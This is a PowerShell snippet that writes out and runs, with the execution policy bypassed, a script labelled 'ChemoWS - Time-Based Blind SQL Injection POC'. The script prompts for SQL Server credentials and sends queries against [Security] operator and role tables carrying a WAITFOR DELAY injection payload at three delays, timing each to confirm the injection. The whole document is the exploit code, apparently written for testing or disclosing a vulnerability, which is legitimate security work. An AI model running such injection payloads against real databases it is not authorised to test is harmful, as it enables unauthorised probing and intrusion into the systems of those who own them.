@'
$server   = Read-Host "Enter server"
$database = Read-Host "Enter database"
$auth     = Read-Host "Use Windows Auth? (y/n)"

if ($auth -eq "y") {
    $connString = "Server=$server;Database=$database;Integrated Security=True;TrustServerCertificate=True;"
} else {
    $user = Read-Host "Enter username"
    $pass = Read-Host "Enter password"
    $connString = "Server=$server;Database=$database;User Id=$user;Password=$pass;TrustServerCertificate=True;"
}

Write-Host "`n============================================================"
Write-Host "ChemoWS - Time-Based Blind SQL Injection POC"
Write-Host "Target: $server | Database: $database"
Write-Host "============================================================`n"

foreach ($delay in @("0:0:2", "0:0:5", "0:0:10")) {
    $conn = New-Object System.Data.SqlClient.SqlConnection($connString)
    $conn.Open()
    $payload = "' WAITFOR DELAY '$delay'--"
    $query = "SELECT TOP 1 O.[UserName] FROM [Security].Operator O JOIN [Security].mapOperatorRole map ON O.Id = map.OperatorsId JOIN [Security].OperatorRole opRole ON map.OperatorRoleId = opRole.Id WHERE username='$payload'"
    $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
    $cmd.CommandTimeout = 30
    $start = Get-Date
    try { $cmd.ExecuteNonQuery() } catch {}
    $end = Get-Date
    Write-Host "Payload: WAITFOR DELAY '$delay' | Expected: $($delay.Split(':')[2])s | Elapsed: $([math]::Round(($end - $start).TotalSeconds, 2)) seconds"
    $conn.Close()
}

Write-Host "`n[+] Proportional delay confirms time-based blind SQL injection"
'@ | Out-File "C:\temp\sqli_poc.ps1"

powershell -ExecutionPolicy Bypass -File "C:\temp\sqli_poc.ps1"
